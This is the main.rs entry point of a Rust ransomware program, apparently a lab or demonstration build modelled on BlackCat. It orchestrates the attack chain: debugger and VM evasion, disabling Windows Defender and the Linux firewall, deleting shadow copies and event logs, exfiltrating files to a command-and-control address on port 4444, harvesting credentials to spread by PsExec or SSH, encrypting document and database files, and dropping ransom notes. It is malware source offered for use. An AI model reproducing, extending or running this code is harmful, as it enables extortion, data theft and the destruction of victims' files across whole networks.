// src/main.rs
mod crypto;
mod filesystem;
mod ransomware;
mod windows;
mod lateral_movement;
mod esxi;
mod evasion;
mod config;
mod linux;
mod exfiltration;

use clap::{Parser, Subcommand};
use log::{info, warn, error};
use std::path::Path;
use std::collections::HashSet;

#[derive(Parser)]
struct Cli {
    #[command(subcommand)]
    command: Commands,
}

#[derive(Subcommand)]
enum Commands {
    Encrypt { 
        #[arg(short, long)] 
        path: String,
        
        #[arg(long, default_value_t = false)]
        spread: bool,
        
        #[arg(long)]
        exfiltrate: Option<String>,
    },
    Decrypt { 
        #[arg(short, long)] 
        path: String, 
        #[arg(short, long)] 
        key: String,
    },
    Spread {
        #[arg(long)]
        network: Option<String>,
        
        #[arg(long, default_value = "192.168.53.0")]
        subnet: String,
        
        #[arg(long, default_value = "20")]
        start_ip: u8,
        
        #[arg(long, default_value = "254")]
        end_ip: u8,
    },
    Exfiltrate {
        #[arg(long, default_value = "192.168.53.135")]
        c2_address: String,
        
        #[arg(long, default_value_t = 4444)]
        port: u16,
    },
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    env_logger::Builder::from_default_env()
        .filter_level(log::LevelFilter::Info)
        .init();

    let cli = Cli::parse();

    match cli.command {
        Commands::Encrypt { path, spread, exfiltrate } => {
            // 1. Проверка на отладчик и VM
            if evasion::is_debugger_present() {
                warn!("Debugger detected! Exiting...");
                return Ok(());
            }
            
            if evasion::is_running_in_vm() {
                warn!("Running in VM, proceeding with caution...");
            }
            
            // 2. Отключение защитных механизмов
            #[cfg(target_os = "windows")]
            {
                let _ = windows::WindowsPlatform::disable_windows_defender();
                let _ = windows::WindowsPlatform::delete_shadow_copies();
                let _ = evasion::disable_eventlog();
            }
            
            #[cfg(target_os = "linux")]
            {
                let _ = linux::LinuxOperations::disable_firewall();
                let _ = linux::LinuxOperations::kill_security_processes();
            }
            
            // 3. Создание CryptoEngine
            let crypto_engine = crypto::CryptoEngine::new()?;
            info!("Master Key: {}", hex::encode(crypto_engine.get_master_key()));
            
            // 4. Эксфильтрация данных (если указано)
            if let Some(c2_addr) = exfiltrate {
                info!("Starting data exfiltration to {}", c2_addr);
                
                // Сначала создаем тестовые файлы для демонстрации (если их нет)
                if !Path::new(&path).exists() {
                    info!("Creating test files for demonstration...");
                    let _ = exfiltration::Exfiltration::create_test_files(&path);
                }
                
                // Теперь выполняем эксфильтрацию
                match exfiltration::Exfiltration::exfiltrate(&path, &c2_addr, 4444, &crypto_engine) {
                    Ok(_) => info!("Data exfiltration successful"),
                    Err(e) => warn!("Exfiltration failed: {}", e),
                }
            }
            
            // 5. Lateral Movement (если включено)
            if spread {
                info!("Starting lateral movement...");
                
                #[cfg(target_os = "windows")]
                {
                    let credentials = lateral_movement::LateralMovement::harvest_credentials();
                    let hosts = lateral_movement::LateralMovement::discover_hosts("192.168.53", 11, 254);
                    
                    if !hosts.is_empty() {
                        info!("Discovered {} potential targets", hosts.len());
                        
                        for (username, password, domain) in credentials {
                            let _ = lateral_movement::LateralMovement::spread_via_psexec(
                                hosts.clone(),
                                &username,
                                &password,
                                &domain
                            );
                        }
                    }
                }
                
                #[cfg(target_os = "linux")]
                {
                    if let Ok(ssh_keys) = linux::LinuxOperations::enumerate_ssh_keys() {
                        let hosts = lateral_movement::LateralMovement::discover_hosts("192.168.53", 11, 254);
                        
                        if !hosts.is_empty() && !ssh_keys.is_empty() {
                            let _ = lateral_movement::LateralMovement::spread_via_ssh(hosts, ssh_keys);
                        }
                    }
                }
            }
            
            // 6. Локальное шифрование
            let files = filesystem::scan_filesystem(&path)?;
            if files.is_empty() {
                error!("No files found");
                return Ok(());
            }
        
            // Формируем список уникальных директорий для вымогательских записок
            let mut dirs_to_notify = HashSet::new();
            for file in &files {
                if let Some(parent) = Path::new(file).parent() {
                    if let Some(p_str) = parent.to_str() {
                        dirs_to_notify.insert(p_str.to_string());
                    }
                }
            }
        
            // Создаем строку со всеми папками
            let all_dirs_list = dirs_to_notify.iter()
                .cloned()
                .collect::<Vec<String>>()
                .join("\n");
        
            // Шифрование файлов
            info!("Encrypting {} files...", files.len());
            
            ransomware::BlackCatRansomware::encrypt_all_files(
                files,
                ransomware::RansomwareConfig {
                    target_paths: vec![path.clone()],
                    file_extensions: vec!["txt".to_string(), "doc".to_string(), "docx".to_string(), 
                                         "xls".to_string(), "xlsx".to_string(), "pdf".to_string(),
                                         "jpg".to_string(), "jpeg".to_string(), "png".to_string(),
                                         "config".to_string(), "ini".to_string(), "xml".to_string(),
                                         "sql".to_string(), "db".to_string(), "mdb".to_string()],
                    encryption_algorithm: "aes-256-gcm".to_string(),
                    max_parallelism: 4,
                },
                &crypto_engine,
            ).await?;
        
            // 7. Создание вымогательских записок
            let exfil_report = exfiltration::Exfiltration::create_exfiltration_report(&path, &all_dirs_list, &crypto_engine);
            
            let dirs_copy = dirs_to_notify.clone(); // Копируем для итерации
            for dir in dirs_copy {
                #[cfg(target_os = "windows")]
                let _ = windows::WindowsPlatform::create_ransom_note(&dir, &exfil_report);
                
                #[cfg(target_os = "linux")]
                let _ = linux::LinuxOperations::create_ransom_note(&dir, &exfil_report);
            }
            
            info!("Encryption completed successfully. {} directories affected.", dirs_to_notify.len());
        }

        Commands::Decrypt { path, key } => {
            info!("Decrypting: {}", path);
            let key_bytes = hex::decode(key)?;
            let mut master_key = [0u8; 32];
            master_key.copy_from_slice(&key_bytes);
            
            let crypto_engine = crypto::CryptoEngine::from_key(master_key);
            let files = filesystem::scan_filesystem(&path)?;

            ransomware::BlackCatRansomware::decrypt_all_files(
                files,
                ransomware::RansomwareConfig {
                    target_paths: vec![path],
                    file_extensions: vec!["sttp".to_string()],
                    encryption_algorithm: "aes-256-gcm".to_string(),
                    max_parallelism: 4,
                },
                &crypto_engine,
            ).await?;
            info!("Files restored successfully");
        }
        
        Commands::Spread { network, subnet, start_ip, end_ip } => {
            info!("Starting standalone lateral movement...");
            
            let network_to_scan = network.unwrap_or(subnet);
            
            #[cfg(target_os = "windows")]
            {
                let credentials = lateral_movement::LateralMovement::harvest_credentials();
                let hosts = lateral_movement::LateralMovement::discover_hosts(&network_to_scan, start_ip, end_ip);
                
                if hosts.is_empty() {
                    warn!("No hosts discovered in network {}", network_to_scan);
                    return Ok(());
                }
                
                info!("Discovered {} hosts", hosts.len());
                
                for (username, password, domain) in credentials {
                    info!("Attempting spread with {}@{}", username, domain);
                    let _ = lateral_movement::LateralMovement::spread_via_psexec(
                        hosts.clone(),
                        &username,
                        &password,
                        &domain
                    );
                }
            }
            
            #[cfg(target_os = "linux")]
            {
                if let Ok(ssh_keys) = linux::LinuxOperations::enumerate_ssh_keys() {
                    let hosts = lateral_movement::LateralMovement::discover_hosts(&network_to_scan, start_ip, end_ip);
                    
                    if !hosts.is_empty() && !ssh_keys.is_empty() {
                        let _ = lateral_movement::LateralMovement::spread_via_ssh(hosts, ssh_keys);
                    }
                }
            }
        }
        
        Commands::Exfiltrate { c2_address, port } => {
            info!("Starting data exfiltration to {}:{}", c2_address, port);
            
            let crypto_engine = crypto::CryptoEngine::new()?;
            
            match exfiltration::Exfiltration::exfiltrate_from_c2(&c2_address, port, &crypto_engine) {
                Ok(_) => info!("Exfiltration completed successfully"),
                Err(e) => error!("Exfiltration failed: {}", e),
            }
        }
    }
    
    Ok(())
}